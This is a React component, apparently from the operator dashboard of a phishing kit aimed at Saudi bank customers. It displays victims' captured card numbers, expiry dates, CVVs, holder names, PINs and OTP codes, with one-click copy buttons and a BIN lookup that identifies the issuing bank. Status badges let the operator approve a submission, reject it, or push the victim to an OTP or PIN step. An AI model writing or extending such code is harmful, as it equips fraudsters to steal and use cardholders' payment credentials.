"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  pendingAction?: string | null
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

interface BinData {
  valid: boolean
  scheme: string
  brand: string
  type: string
  level: string
  currency: string
  issuer: { name: string }
  country: { country: string }
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase()
  // Saudi National Bank / Al Ahli / SNB
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national") || n.includes("saudi national")) return "/logo-snb.png"
  // Al Rajhi Bank
  if (n.includes("راجح") || n.includes("rajhi") || n.includes("al rajhi")) return "/logo-rajhi.png"
  // Riyadh Bank
  if (n.includes("رياض") || n.includes("riyad") || n.includes("riyadh bank")) return "/logo-riyad.jpg"
  // Alinma Bank
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png"
  return null
}

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png"
  if (brand === "VISA") return "/logo-visa.png"
  if (brand === "MASTERCARD") return "/logo-mastercard.png"
  return null
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  pendingAction,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    // Show pending action if available (immediate feedback during processing)
    if (pendingAction) {
      return (
        <span className="inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border bg-blue-50 text-blue-700 border-blue-200 animate-pulse">
          {pendingAction}
        </span>
      )
    }
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts)
    const mm = String(d.getMonth() + 1).padStart(2, "0")
    const dd = String(d.getDate()).padStart(2, "0")
    let h = d.getHours()
    const min = String(d.getMinutes()).padStart(2, "0")
    const ampm = h >= 12 ? "م" : "ص"
    h = h % 12 || 12
    return `${mm}-${dd} | ${h}:${min} ${ampm}`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  // Extract card data outside hooks
  const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
  const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
  const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
  const expiry     = rawExpiry || "••/••"
  const rawCvv     = (data["CVV"] || "").toString().trim()
  const cvv        = rawCvv || "•••"
  const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
  const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
  const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
  const bankName   = data["البنك"] || ""
  const bankCountry = data["بلد البنك"] || ""

  // Fetch BIN info for card details
  const [binData, setBinData] = useState<BinData | null>(null)
  const binFetchedRef = useRef(false)

  useEffect(() => {
    if (!isCardData || !rawNum || rawNum.length < 6 || binFetchedRef.current) return
    binFetchedRef.current = true

    const bin = rawNum.slice(0, 6)
    fetch(`/api/bin?bin=${bin}`)
      .then(res => res.json())
      .then(json => {
        if (json?.BIN?.valid) {
          setBinData(json.BIN)
        }
      })
      .catch(console.error)
  }, [isCardData, rawNum])

  // Use BIN data if available, otherwise fall back to original data
  const binBankName = binData?.issuer?.name || bankName
  const binCountry = binData?.country?.country || bankCountry
  const binScheme = binData?.scheme || cardType
  const binLevel = binData?.level || cardLevel

  const typeLower  = binScheme.toLowerCase()
  let brand = "CARD"
  if (typeLower.includes("visa"))   brand = "VISA"
  else if (typeLower.includes("master")) brand = "MASTERCARD"
  else if (typeLower.includes("mada"))   brand = "MADA"
  else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

  const bankLogoUrl = getBankLogoUrl(binBankName)
  const networkLogoUrl = getNetworkLogoUrl(brand)

  // Determine card background based on brand/country
  const getCardBackground = () => {
    // Saudi banks - green theme
    if (binCountry?.toLowerCase().includes("saudi") || binBankName?.toLowerCase().includes("saudi") || binBankName?.toLowerCase().includes("al ") || binBankName?.toLowerCase().includes("rajhi") || binBankName?.toLowerCase().includes("riyad") || binBankName?.toLowerCase().includes("national")) {
      return "linear-gradient(135deg, #0d6e3f 0%, #0a5c32 40%, #084026 100%)"
    }
    // MADA cards - purple theme
    if (brand === "MADA") {
      return "linear-gradient(135deg, #6b21a8 0%, #581c87 50%, #4c1d95 100%)"
    }
    // Visa cards - blue theme  
    if (brand === "VISA") {
      return "linear-gradient(135deg, #1e40af 0%, #1e3a8a 50%, #1e3a5f 100%)"
    }
    // Mastercard - red/orange theme
    if (brand === "MASTERCARD") {
      return "linear-gradient(135deg, #dc2626 0%, #b91c1c 50%, #991b1b 100%)"
    }
    // Default - elegant dark green
    return "linear-gradient(135deg, #0f4c35 0%, #0a3d2a 50%, #073326 100%)"
  }

  const getTextColor = () => "white"
  const cardBg = getCardBackground()

  if (isCardData) {

    return (
      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100 flex-shrink-0" style={{ fontFamily: "Cairo, Tajawal, sans-serif", width: "500px", height: "340px", display: "flex", flexDirection: "column" }}>

        {/* Bubble header */}
        <div className="flex items-center justify-center px-4 py-2 border-b border-gray-100 relative">
          <span className="text-sm font-bold text-gray-800">{title}</span>
          <div className="absolute right-4 flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
            )}
          </div>
        </div>

        <div className="flex-1 p-3 flex items-center justify-center">
          {/* ─── Credit Card Visual with dynamic background ─── */}
          <div
            className="relative rounded-2xl overflow-hidden"
            style={{
              width: "100%",
              height: "100%",
              background: cardBg,
              boxShadow: "0 6px 24px rgba(0,0,0,0.2), 0 2px 6px rgba(0,0,0,0.1)"
            }}
          >
            {/* Sheen overlay */}
            <div className="absolute inset-0 pointer-events-none" style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.2) 0%, transparent 50%)" }} />

            {/* Card inner content */}
            <div className="relative h-full flex flex-col px-4 py-3 justify-between" style={{ color: getTextColor() }}>

              {/* Top row: SAR badge + Country + Bank logo */}
              <div className="flex items-end justify-end" style={{ direction: "rtl" }}>
                <div className="flex items-center gap-1">
                  {binCountry && binCountry !== "غير محدد" && (
                    <div
                      className="text-[9px] font-bold"
                      style={{ border: "1.5px solid rgba(255,255,255,0.35)", borderRadius: "6px", padding: "1px 7px", background: "rgba(0,0,0,0.2)", color: "white" }}
                    >
                      {binCountry}
                    </div>
                  )}
                  <div
                    className="text-[10px] font-bold"
                    style={{ border: "1.5px solid rgba(255,255,255,0.35)", borderRadius: "6px", padding: "2px 9px", background: "rgba(0,0,0,0.2)", color: "white" }}
                  >
                    SAR
                  </div>
                </div>
                {bankLogoUrl ? (
                  <div style={{ background: "rgba(255,255,255,0.1)", backdropFilter: "blur(8px)", WebkitBackdropFilter: "blur(8px)", borderRadius: "6px", padding: "3px 8px", display: "inline-flex", alignItems: "center", border: "1px solid rgba(255,255,255,0.2)" }}>
                    <img src={bankLogoUrl} alt={binBankName} className="h-5 max-w-[90px] object-contain" style={{ filter: "brightness(0) invert(1)" }} />
                  </div>
                ) : (
                  binBankName && binBankName !== "غير محدد" && !binBankName.toLowerCase().includes("master") && !binBankName.toLowerCase().includes("visa") && !binBankName.toLowerCase().includes("card") ? (
                    <span className="font-bold text-white text-[11px]" style={{ direction: "ltr", textShadow: "0 1px 2px rgba(0,0,0,0.3)" }}>
                      {binBankName}
                    </span>
                  ) : networkLogoUrl ? (
                    <div style={{ background: "rgba(255,255,255,0.1)", backdropFilter: "blur(8px)", WebkitBackdropFilter: "blur(8px)", borderRadius: "6px", padding: "3px 8px", display: "inline-flex", alignItems: "center", border: "1px solid rgba(255,255,255,0.2)" }}>
                      <img src={networkLogoUrl} alt={brand} className="h-5 max-w-[65px] object-contain" style={{ filter: "brightness(0) invert(1)" }} />
                    </div>
                  ) : null
                )}
              </div>

              {/* Middle: Card Number (centered) */}
              <div className="flex justify-center">
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-center"
                >
                  <div className="font-mono font-bold tracking-widest group-hover:opacity-70 transition-opacity" style={{ direction: "ltr", fontSize: "18px", color: "white", textShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
                    {cardNumber}
                  </div>
                </button>
              </div>

              {/* Bottom section: Holder name + Card type (left) + Expiry + CVV (right) */}
              <div className="flex flex-col gap-1">
                {/* Holder name */}
                <div className="text-left" style={{ direction: "ltr" }}>
                  <div className="font-bold text-[11px] uppercase" style={{ color: "white", textShadow: "0 1px 2px rgba(0,0,0,0.3)" }}>{holder}</div>
                </div>

                {/* Card type (left) + Expiry/CVV (left) + Country/SA (right) */}
                <div className="flex items-end justify-between">
                  <div className="flex flex-col gap-1">
                    <div>
                      <div className="text-[8px] font-medium" style={{ color: "rgba(255,255,255,0.55)" }}>CVV  EXPIRES</div>
                      <button
                        type="button"
                        onClick={() => void handleCopy("cvv", rawCvv)}
                        disabled={!isCopyableValue(rawCvv)}
                        title="نسخ CVV"
                        className="group"
                      >
                        <div className="font-mono font-bold text-[12px] group-hover:opacity-70 transition-opacity" style={{ direction: "ltr", color: "white", textShadow: "0 1px 2px rgba(0,0,0,0.3)" }}>
                          {copiedField === "cvv" ? "✓" : cvv}  {expiry}
                        </div>
                      </button>
                    </div>
                    <div>
                      <span className="text-[8px] font-bold uppercase tracking-wide" style={{ color: "rgba(255,255,255,0.75)", textShadow: "0 1px 2px rgba(0,0,0,0.3)" }}>
                        {[
                          !networkLogoUrl && brand !== "CARD" && binLevel !== "غير محدد" ? brand : null,
                          binLevel && binLevel !== "غير محدد" ? binLevel : null
                        ].filter(Boolean).join(" · ")}
                      </span>
                    </div>
                  </div>
                  <div className="text-right flex flex-col items-end gap-1">
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* ─── Tags below card (hidden) ─── */}
          <div className="hidden mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">{bankName}</span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">{bankCountry}</span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">{cardType}</span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">{cardLevel}</span>
            )}
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100 flex-shrink-0"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif", width: "500px" }}
    >
      {/* Header */}
      <div className="flex items-center justify-center px-4 py-2.5 border-b border-gray-100 relative">
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
        <div className="absolute right-4 flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
          )}
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-4">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-3 py-4" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-12 h-14 rounded-lg bg-gray-50 border-2 border-gray-300 shadow-md flex items-center justify-center"
              >
                <span className="text-2xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="space-y-3">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex items-center justify-between gap-4 py-2">
                  <span className="text-gray-900 font-semibold text-sm break-words text-left">{str}</span>
                  <span className="text-gray-600 text-sm font-medium shrink-0 text-right whitespace-nowrap">{key}:</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex flex-col gap-3 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          {status && <div className="flex justify-center">{getStatusBadge()}</div>}
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
